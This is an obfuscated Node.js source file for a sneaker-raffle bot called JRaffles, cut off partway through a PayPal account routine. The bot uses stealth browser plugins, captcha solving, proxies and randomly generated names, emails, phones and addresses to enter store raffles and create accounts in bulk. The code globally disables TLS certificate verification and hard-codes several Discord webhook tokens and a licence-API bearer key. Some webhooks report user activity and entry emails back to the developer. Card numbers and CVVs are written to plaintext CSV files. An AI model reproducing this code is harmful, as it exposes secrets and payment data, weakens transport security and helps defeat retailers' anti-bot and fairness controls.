process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x57b36f = require('fs'), _0x3a249a = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x4f5bd7(_0x460c41) {
    const _0xe69632 = _0x57b36f['createWriteStream'](_0x460c41, { 'flags': 'a' }), _0x23a9e6 = console['log'];
    console['log'] = function () {
        const _0x50d2a3 = Array['prototype']['slice']['call'](arguments), _0x2c2b87 = _0x50d2a3['join']('\x20') + '\x0a';
        _0xe69632['write'](_0x2c2b87), _0x23a9e6['apply'](console, _0x50d2a3);
    };
}
_0x4f5bd7('../logs/log\x20' + _0x3a249a);
var _0x2b6e0b = require('tough-cookie'), _0x10db71 = require('node-imap'), _0xcc6576 = require('util')['inspect'];
const _0xd18e10 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4c0d39 } = require('discord.js');
var _0x142cd3 = require('exe');
const { execFile: _0x2e9738 } = require('child_process'), _0x1f8a8f = require('puppeteer-extra'), _0x561a9c = require('puppeteer-extra-plugin-recaptcha'), _0x2f231a = require('puppeteer-extra-plugin-stealth'), _0x11085b = require('chalk'), _0x3ec78c = require('node-bash-title'), _0x3d9190 = require('axios'), _0x296e07 = require('papaparse');
var _0xfac550 = require('random-name');
const _0x31e459 = require('request');
var _0x240076 = require('prompt');
const _0x27c7cf = _0x31e459['jar']();
var _0x1d78d4 = {};
const _0x17b1e4 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x4ddf1b = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x4feb05 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x20c6c3 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1b1c4c = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x138219 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x3ccb51 = 'https://discord.com/api/webhooks/', _0x2f975f = '' + _0x3ccb51 + _0x4feb05, _0x2ffc54 = '' + _0x3ccb51 + _0x20c6c3, _0x492271 = '' + _0x3ccb51 + _0x17b1e4, _0xfda3c6 = '' + _0x3ccb51 + _0x4ddf1b, _0x323e07 = '' + _0x3ccb51 + _0x1b1c4c, _0x5eff72 = '' + _0x3ccb51 + _0x138219;
const _0x3030ed = JSON['parse'](_0x57b36f['readFileSync']('../package.json', 'utf-8')), _0x152cdf = _0x3030ed['version'];
var _0x3fcfb6, _0x1a359b, _0x52fb01, _0xe476c9, _0x4b1bb7, _0x1bc9d9, _0x5c7ae6, _0x5e6a93;
const _0xfe3fe0 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x1e2225 = ![];
const _0x29e9e4 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1555bd = '0123456789';
var _0x1d70c2 = _0x29e9e4['split']('');
const _0xa95578 = require('auto-git-update'), _0x2a5adc = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x28ce09 = new _0xa95578(_0x2a5adc);
async function _0x4f6c6c() {
    _0x4b1bb7 = _0x57b36f['readdirSync']('../proxies'), _0xe476c9 = _0x57b36f['readdirSync']('../tasks'), !_0x57b36f['existsSync']('../accounts/fenom.csv') && _0x57b36f['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x57b36f['existsSync']('../accounts/paypal.csv') && _0x57b36f['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x57b36f['existsSync']('../accounts/bstn.csv') && _0x57b36f['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x57b36f['existsSync']('../accounts/eql.csv') && _0x57b36f['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x57b36f['existsSync']('../failed-tasks.csv') && _0x57b36f['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x57b36f['existsSync']('../successful-tasks.csv') && _0x57b36f['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x1d78d4 = JSON['parse'](_0x57b36f['readFileSync']('../settings.json', 'utf-8')), !_0x1d78d4['delay'] && (_0x1d78d4['delay'] = 0x3c, _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), !_0x1d78d4['threads'] && (_0x1d78d4['threads'] = 0x1, _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), !_0x1d78d4['masterMail'] && (_0x1d78d4['masterMail'] = 'yourmail@gmail.com', _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), !_0x1d78d4['masterPassword'] && (_0x1d78d4['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), !_0x1d78d4['captchaKey'] && (_0x1d78d4['captchaKey'] = '', _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), !_0x1d78d4['useRandomProxy'] && (_0x1d78d4['useRandomProxy'] = !![], _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), !_0x1d78d4['shuffleTasks'] && (_0x1d78d4['shuffleTasks'] = ![], _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), !_0x1d78d4['webhook'] && (_0x1d78d4['webhook'] = '', _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), _0x1d78d4['delay'] <= 0x1388 && (_0x1d78d4['delay'] = _0x1d78d4['delay'] * 0x3e8), _0x1d78d4['AfewDelay'] && (delete _0x1d78d4['AfewDelay'], _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), _0x1d78d4['MahaDelay'] && (delete _0x1d78d4['MahaDelay'], _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), _0x1d78d4['footshopDelay'] && (delete _0x1d78d4['footshopDelay'], _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4, null, 0x2))), _0x1d78d4['MahaDelay'] = _0x1d78d4['delay'], _0x3ccb51 = _0x1d78d4['webhook'], _0x1bc9d9 = _0x1d78d4['licenseKey'];
}
let _0x170b6b, _0xb346cf = [], _0x338c99;
const _0x73bf2c = _0x2241ea => new Promise(_0x32360f => setTimeout(_0x32360f, _0x2241ea));
function _0x52c272(_0x357991, _0x4160d8) {
    return Math['floor'](Math['random']() * (_0x4160d8 - _0x357991 + 0x1) + _0x357991);
}
function _0x569014(_0x35d9d0) {
    let _0x57ea2b = _0x35d9d0['length'], _0x2b7398;
    while (_0x57ea2b != 0x0) {
        _0x2b7398 = Math['floor'](Math['random']() * _0x57ea2b), _0x57ea2b--, [_0x35d9d0[_0x57ea2b], _0x35d9d0[_0x2b7398]] = [
            _0x35d9d0[_0x2b7398],
            _0x35d9d0[_0x57ea2b]
        ];
    }
    return _0x35d9d0;
}
async function _0x2cbd08(_0xa56c7e) {
    return _0x3d9190['get']('https://api.hyper.co/v4/licenses/' + _0xa56c7e, { 'headers': { 'Authorization': 'Bearer\x20' + _0xfe3fe0 } })['then'](_0x4946d2 => _0x4946d2['data'])['catch'](() => null);
}
;
async function _0x134bd0(_0x3c226f) {
    console['clear']();
    if (_0x3c226f == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x44b526 = await _0x240076['get']('License');
        if (_0x44b526['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x73bf2c(0xbb8), _0x134bd0(_0x3c226f);
        _0x3c226f = _0x44b526['License'], _0x1d78d4['licenseKey'] = _0x3c226f, _0x1bc9d9 = _0x3c226f, _0x57b36f['writeFileSync']('../settings.json', JSON['stringify'](_0x1d78d4));
    }
    console['log']('Checking\x20license\x20' + _0x1bc9d9 + '...'), await _0x73bf2c(0x320);
    const _0x43dd3b = await _0x2cbd08(_0x3c226f);
    _0x5c7ae6 = JSON['stringify'](_0x43dd3b['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x5e6a93 = JSON['stringify'](_0x43dd3b['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x43dd3b)
        return console['log']('License\x20not\x20found');
    if (!_0x43dd3b['user'])
        return console['log']('License\x20not\x20bound');
    return _0x43dd3b['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x1e2225 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x1e2225 = ![]);
}
async function _0x197e0d() {
    var _0x5a954d = await _0x240076['get']('Module');
    return console['clear'](), _0x5a954d['Module'];
}
;
async function _0x33eff7() {
    var _0x21606b = await _0x240076['get']('Setting');
    return console['clear'](), _0x21606b['Setting'];
}
async function _0x1c608c(_0x3fa6ad) {
    var _0x4fc667 = [];
    for (file of _0xe476c9) {
        var _0x26d94c = _0x57b36f['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x296e07['parse'](_0x26d94c, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x3fa6ad['store'] && _0x4fc667['push'](file);
    }
    !_0x4fc667['length'] == 0x0 && (_0xe476c9 = _0x4fc667);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x2f55d1 = 0x0; _0x2f55d1 < _0xe476c9['length']; _0x2f55d1++) {
        console['log']('\x20(' + _0x2f55d1 + ')\x20' + _0xe476c9[_0x2f55d1]);
    }
    console['log']('');
    var _0x4f3081 = await _0x240076['get']('Task');
    if (_0x4f3081['Task'] > _0xe476c9['length'] - 0x1 || isNaN(_0x4f3081['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x73bf2c(0x3e8), _0x1c608c();
    var _0x34542c = _0x57b36f['readFileSync']('../tasks/' + _0xe476c9[_0x4f3081['Task']], 'utf-8');
    return _0x52fb01 = _0x296e07['parse'](_0x34542c, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x11085b['blue'](_0xe476c9[_0x4f3081['Task']])), _0x3fcfb6 = _0xe476c9[_0x4f3081['Task']], _0x52fb01;
}
async function _0x17a853() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x311989 = 0x0; _0x311989 < _0x4b1bb7['length']; _0x311989++) {
        console['log']('\x20(' + _0x311989 + ')\x20' + _0x4b1bb7[_0x311989]);
    }
    console['log']('');
    var _0x5780a9 = await _0x240076['get']('Proxies');
    if (_0x5780a9['Proxies'] > _0x4b1bb7['length'] - 0x1 || isNaN(_0x5780a9['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x73bf2c(0x3e8), _0x17a853();
    var _0x2b528b = _0x57b36f['readFileSync']('../proxies/' + _0x4b1bb7[_0x5780a9['Proxies']], 'utf-8')['split']('\x0a');
    let _0x4000cb = _0x2b528b['map']((_0x516f6f, _0x4573b4) => {
        sanatizeProxy = _0x516f6f['replace']('\x0d', '');
        if (_0x2b528b[_0x4573b4 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1a359b = _0x4b1bb7[_0x5780a9['Proxies']], console['clear'](), _0x4000cb;
}
async function _0x1d5501() {
    var _0x3f00d = await _0x240076['get']('Value');
    return console['clear'](), _0x3f00d['Value'];
}
async function _0x137260(_0x5e5a3e) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x2b9c33 = 0x0; _0x2b9c33 < _0x5e5a3e['length']; _0x2b9c33++) {
        console['log']('\x20(' + _0x2b9c33 + ')\x20[' + _0x5e5a3e[_0x2b9c33]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x18cf88 = await _0x240076['get']('Module');
    return _0x18cf88['Module'];
}
async function _0x4ae888() {
    var _0x240f13 = await _0x240076['get']('Password');
    return console['clear'](), _0x240f13['Password'];
}
;
async function _0x532908() {
    var _0x1f22af = await _0x240076['get']('Links');
    return _0x1f22af['Links'];
}
;
async function _0x5e7947() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x21a6e0 = 0x0; _0x21a6e0 < _0xb346cf['length']; _0x21a6e0++) {
        console['log']('\x20(' + _0x21a6e0 + ')\x20' + _0xb346cf[_0x21a6e0]);
    }
    ;
    console['log']();
    let _0x5e4a6b = await _0x240076['get']('Product');
    return console['clear'](), _0x5e4a6b['Product'];
}
;
function _0x4ea3c7() {
    var _0x1af9b1 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x1af9b1;
}
;
function _0x297583() {
    var _0x382bf3 = new Date(Date['now']())['toLocaleString']();
    return _0x382bf3['replace'](',', '');
}
async function _0x5cd94d(_0x5b273d, _0x42ab18) {
    let _0x5677fe = { 'headers': { 'content-type': 'application/json' } };
    if (_0x152cdf != 'devkey') {
        await _0x3d9190['post'](_0x5b273d, _0x42ab18, _0x5677fe);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x1bd114(_0x148100, _0x54237a, _0x1ae531, _0x1633ab, _0x1d2d41) {
    if (!_0x1633ab && _0x1ae531 == 'dev') {
        var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x54237a['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x54237a['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x148100['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x1d78d4['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5c7ae6,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x148100['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x148100['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x152cdf,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x2fa25c['data'];
    } else {
        if (_0x1633ab && _0x1ae531 == 'dev') {
            var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x54237a['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5c7ae6,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x54237a['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x148100['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x1d78d4['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x1d2d41,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x148100['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x148100['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x152cdf,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x2fa25c['data'];
        } else {
            if (_0x1ae531 == 'pub') {
                var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x54237a['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x54237a['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x148100['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x1d78d4['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x148100['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x152cdf,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x2fa25c['data'];
            } else {
                if (_0x1ae531 == 'acc' && !_0x1633ab) {
                    var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x54237a['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5c7ae6,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x54237a['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x1d78d4['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x152cdf,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x2fa25c['data'];
                } else {
                    if (_0x1ae531 == 'acc' && _0x1633ab) {
                        var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x54237a['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x5c7ae6,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x1d2d41,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x54237a['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x1d78d4['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x152cdf,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x2fa25c['data'];
                    } else {
                        if (_0x1ae531 == 'open') {
                            var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x5e6a93)['addFields']({
                                'name': 'User',
                                'value': '' + _0x5c7ae6,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x152cdf,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x2fa25c['data'];
                        } else {
                            if (!_0x1633ab && _0x1ae531 == 'ver') {
                                var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x54237a['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5c7ae6,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x54237a['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x1d78d4['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x152cdf,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x2fa25c['data'];
                            } else {
                                if (_0x1633ab && _0x1ae531 == 'ver') {
                                    var _0x2fa25c = new _0x4c0d39()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x54237a['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x5c7ae6,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x1d2d41,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x54237a['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x1d78d4['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x152cdf,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x2fa25c['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x4b6344(_0x4010a4, _0x2b5a2b) {
    var _0x278b22 = _0x4010a4[_0x2b5a2b]['Address1']['split'](''), _0x1539a9 = _0x4010a4[_0x2b5a2b]['Address2']['split'](''), _0x1bd1a4 = _0x4010a4[_0x2b5a2b]['Email']['split']('@');
    for (var _0x2e86ae = 0x0; _0x2e86ae < _0x278b22['length']; _0x2e86ae++) {
        if (_0x278b22[_0x2e86ae] == 'X') {
            var _0x374495 = Math['round'](Math['random']() * (_0x29e9e4['length'] - 0x1));
            _0x278b22[_0x2e86ae] = _0x1d70c2[_0x374495];
        }
    }
    ;
    for (var _0x2e86ae = 0x0; _0x2e86ae < _0x1539a9['length']; _0x2e86ae++) {
        if (_0x1539a9[_0x2e86ae] == 'X') {
            var _0x374495 = Math['round'](Math['random']() * (_0x29e9e4['length'] - 0x1));
            _0x1539a9[_0x2e86ae] = _0x1d70c2[_0x374495];
        }
    }
    ;
    _0x4010a4[_0x2b5a2b]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x4010a4[_0x2b5a2b]['FirstName'] = _0xfac550['first']());
    _0x4010a4[_0x2b5a2b]['LastName']['toUpperCase']() == 'RANDOM' && (_0x4010a4[_0x2b5a2b]['LastName'] = _0xfac550['last']());
    _0x1bd1a4[0x0]['toUpperCase']() == 'RANDOM' ? _0x1bd1a4[0x0] = '' + _0xfac550['first']() + _0xfac550['last']() + _0x52c272(0x1, 0x3e7) + '@' : _0x1bd1a4[0x0] = _0x1bd1a4[0x0] + '@';
    _0x4010a4[_0x2b5a2b]['Email'] = _0x1bd1a4['join'](''), _0x4010a4[_0x2b5a2b]['Address1'] = _0x278b22['join'](''), _0x4010a4[_0x2b5a2b]['Address2'] = _0x1539a9['join']('');
    _0x4010a4[_0x2b5a2b]['Phone'] == 'RANDOM' && (_0x4010a4[_0x2b5a2b]['Phone'] = '0' + _0x52c272(0x5f5e100, 0x3b9ac9ff));
    if (_0x4010a4[_0x2b5a2b]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x55814e = _0x52c272(0x1, 0x270f);
        _0x4010a4[_0x2b5a2b]['Follower'] = '' + _0xfac550['first']() + _0xfac550['last']() + _0x55814e + '\x20';
    }
    _0x4010a4[_0x2b5a2b]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x4010a4[_0x2b5a2b]['HouseNumber'] = _0x52c272(0x1, 0xc8));
    if (_0x4010a4[_0x2b5a2b]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x1ca7aa = Math['round'](Math['random']() * (_0x29e9e4['length'] - 0x1)), _0x57af38 = _0x1d70c2[_0x1ca7aa];
        _0x4010a4[_0x2b5a2b]['Address1'] = _0xfac550['last']() + 'straat', _0x4010a4[_0x2b5a2b]['Zip'] == '' && (_0x4010a4[_0x2b5a2b]['Postcode'] = _0x52c272(0x3e8, 0x270f) + '\x20' + _0x57af38 + _0x57af38, _0x4010a4[_0x2b5a2b]['Zip'] = _0x4010a4[_0x2b5a2b]['Postcode']), _0x4010a4[_0x2b5a2b]['HouseNumber'] = '' + _0x52c272(0x1, 0xc8);
    }
    return;
}
;
async function _0x3fe3d2(_0x4e5367, _0x32aa67) {
    _0x57b36f['appendFileSync']('../failed-tasks.csv', _0x297583() + ',' + _0x32aa67['store'] + ',' + _0x32aa67['name'] + ',' + _0x4e5367['Url'] + ',' + _0x4e5367['Size'] + ',' + _0x4e5367['Follower'] + ',' + _0x4e5367['FirstName'] + ',' + _0x4e5367['LastName'] + ',' + _0x4e5367['Address1'] + ',' + _0x4e5367['Address2'] + ',' + _0x4e5367['HouseNumber'] + ',' + _0x4e5367['Zip'] + ',' + _0x4e5367['City'] + ',' + _0x4e5367['State'] + ',' + _0x4e5367['Country'] + ',' + _0x4e5367['Phone'] + ',' + _0x4e5367['Email'] + ',' + _0x4e5367['Password'] + ',' + _0x4e5367['PaymentMethod'] + ',' + _0x4e5367['CardType'] + ',' + _0x4e5367['NameOnCard'] + ',' + _0x4e5367['CardNumber'] + ',' + _0x4e5367['ExpiryDate'] + ',' + _0x4e5367['CVV'] + ',' + _0x4e5367['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x5584d0(_0x1ecefc, _0x4a220e) {
    _0x57b36f['appendFileSync']('../successful-tasks.csv', _0x297583() + ',' + _0x4a220e['store'] + ',' + _0x4a220e['name'] + ',' + _0x1ecefc['Url'] + ',' + _0x1ecefc['Size'] + ',' + _0x1ecefc['Follower'] + ',' + _0x1ecefc['FirstName'] + ',' + _0x1ecefc['LastName'] + ',' + _0x1ecefc['Address1'] + ',' + _0x1ecefc['Address2'] + ',' + _0x1ecefc['HouseNumber'] + ',' + _0x1ecefc['Zip'] + ',' + _0x1ecefc['City'] + ',' + _0x1ecefc['State'] + ',' + _0x1ecefc['Country'] + ',' + _0x1ecefc['Phone'] + ',' + _0x1ecefc['Email'] + ',' + _0x1ecefc['Password'] + ',' + _0x1ecefc['PaymentMethod'] + ',' + _0x1ecefc['CardType'] + ',' + _0x1ecefc['NameOnCard'] + ',' + _0x1ecefc['CardNumber'] + ',' + _0x1ecefc['ExpiryDate'] + ',' + _0x1ecefc['CVV'] + ',' + _0x1ecefc['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x5cc2fe() {
    let _0x5d5f71 = proxyFile['split']('\x0a'), _0x2ab393 = _0x5d5f71['map']((_0x212bf7, _0x2b2c58) => {
        sanatizeProxy = _0x212bf7['replace']('\x0d', '');
        if (_0x5d5f71[_0x2b2c58 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2ab393;
}
;
async function _0x358d68(_0x27d890, _0x883492) {
    if (_0x40ca6a != 'yes')
        var _0x40ca6a = '', _0x5b0f21 = 0x0;
    async function _0x360993() {
        var _0x72c64a = _0x57b36f['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x58ea0a = _0x296e07['parse'](_0x72c64a, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x5bcd03 = 0x0; _0x5bcd03 < _0x58ea0a['length']; _0x5bcd03++) {
            console['log']('(' + _0x5bcd03 + ')\x20' + _0x58ea0a[_0x5bcd03]['Email']);
        }
        console['log']('\x0a(' + _0x58ea0a['length'] + ')\x20' + _0x11085b['cyan']('Add\x20a\x20new\x20account'));
        let _0x47f642 = await _0x240076['get']('Option');
